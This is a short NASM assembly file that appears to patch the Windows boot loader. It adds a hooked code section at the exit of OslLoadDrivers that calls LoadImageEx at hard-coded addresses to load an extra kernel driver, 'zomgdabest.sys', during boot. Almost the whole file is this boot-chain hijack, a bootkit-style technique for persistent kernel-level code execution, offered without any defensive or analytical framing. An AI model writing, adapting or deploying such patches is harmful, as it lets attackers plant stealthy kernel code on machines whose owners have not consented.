%define LoadImageEx                 (0x4065c0 - 0x116000)
%define RegularExit_OslLoadDrivers  (0x405b99 - 0x116000)
%define SEGMENT_START               (0x4c3000 - 0x116000)

BITS 64 ; Y U NO ALL THE BITS?

; TO CALL TO BOOTY, you want JUMP 0x4c301b ;)
SECTION .booty
    driverPath db "\SystemRoot\zomgdabest.sys", 0

    ; since we're jumping here at the end of the function
    ; re-run the checks to see if we got here by regular exit
    ; ie don't run the below code if we were only gonna exit because of failure
    cmp     rdi, r15
    jnz     cleanup

    cmp     eax, ebx
    jnz     cleanup

    mov     rcx, SEGMENT_START + driverPath
    ;mov     dword [rsp+0B8h+var_98], 0E0000013h            ; in case warning was called, this gets wiped out
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    
    mov     r14, LoadImageEx
    call    r14

cleanup:
    pop     r15
    pop     r14
    pop     r13
    pop     r12
    pop     rdi
    pop     rsi
    pop     rbp
    retn